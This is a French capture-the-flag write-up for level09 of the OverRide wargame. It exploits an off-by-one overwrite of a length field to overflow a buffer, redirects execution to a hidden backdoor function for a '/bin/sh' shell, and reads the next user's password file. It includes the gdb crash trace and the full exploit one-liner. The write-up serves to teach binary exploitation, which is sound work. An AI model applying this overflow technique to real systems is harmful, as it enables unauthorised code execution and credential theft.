## level09
- À l'usage, le binaire ressemble à une pseudo-messagerie, demandant un nom d'utilisateur et un message.
- En regardant le [code source désassemblé](/level09/source.c) :
    - Le binaire utilise une structure pour stocker les messages :
    ```C
    struct msn {
    char message[140];
    char username[40];
    int len;
    } msg;
    ```
    On voit que `len` est à la suite de `username`. Or dans la fonction `set_username`, la boucle d'assignation de `msg->username` copie un caractère de trop : il est donc possible d'écraser le dernier octet de `msg->len`. Cette variable est ensuite utilisée dans la fonction `set_msg` au moment du `strncpy`.
    - Il y a une fonction `secret_backdoor` qui permet d'exécuter la commande lue sur l'entrée standard.
- L'objectif de notre exploit sera donc d'écraser l'octet le moins significatif de `msg->len` (pour faire passer cette variable à 255). En écrivant 255 octets lors du `strncpy`, on pourrait écrire au delà de la `struct msn` et écraser l'adresse de retour de la fonction `handle_msg`. Notre exploit profitera donc du nom d'utilisateur et du message.
    - Pour le nom d'utilisateur, il s'agit simplement de remplir 40 caractères avant d'écrire `0xff` (255 en décimal) au 41e : `python -c "print '\x90'*40 + '\xff' + '\n'`
    - Pour le message, notre exploit aura deux tâches : appeller l'adresse de la fonction `secret_backdoor` et lui transmettre le paramètre `/bin/sh`.
        - Comme l'ASLR ([*Address Space Layout Randomization*](https://en.wikipedia.org/wiki/Address_space_layout_randomization)) a été utilisé pour ce binaire, un simple `objdump -t level09` ne suffira pas pour obtenir l'adresse de la fonction `secret_backdoor`. Puisqu'il s'agit d'un [*Position-independent executable*](https://en.wikipedia.org/wiki/Position-independent_code#PIE), cette adresse ne peut être obtenue qu'à l'exécution. En lançant le binaire depuis `gdb`, un simple `x secret_backdoor` nous permet de récupérer l'adresse : `0x55555555488c`
        - Il reste encore à déterminer le décalage nécessaire dans le message. On voit que peut faire planter le binaire avec une longueur trop importante. Cela nous permet d'arriver progressivement à la bonne valeur :
        ```
        level09@OverRide:~$ gdb level09
        ...
        (gdb) run < <(python -c "print 'A'*40 + '\xff' + '\n' + 'B'*180 + 'CCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ111222333444555666777888999000aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqrrrssstttuuuvvvwwwwxxxyyyzzz'")
        ...
        Program received signal SIGSEGV, Segmentation fault.
        0x0000555555554931 in handle_msg ()
        (gdb) info register
        ...
        rbp            0x4949484848474747	0x4949484848474747
        ...
        ```
        Au moment du plantage, l'ebp avait la valeur `0x4949484848474747`, ce qui correspond en ASCII à `IIHHHGGG` : on a commencé à réécrire l'ebp à partir du 200e caractère.
- Au final, notre exploit sera donc de la forme `(python -c "print '\x90'*40 + '\xff' + '\n' + '\x90'*200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat) | ./level09`. On obtient le flag avec `cat /home/users/end/.pass`. On peut se connecter en tant qu'utilisateur `end` et profiter du message de félicitations contenu dans le fichier `end`.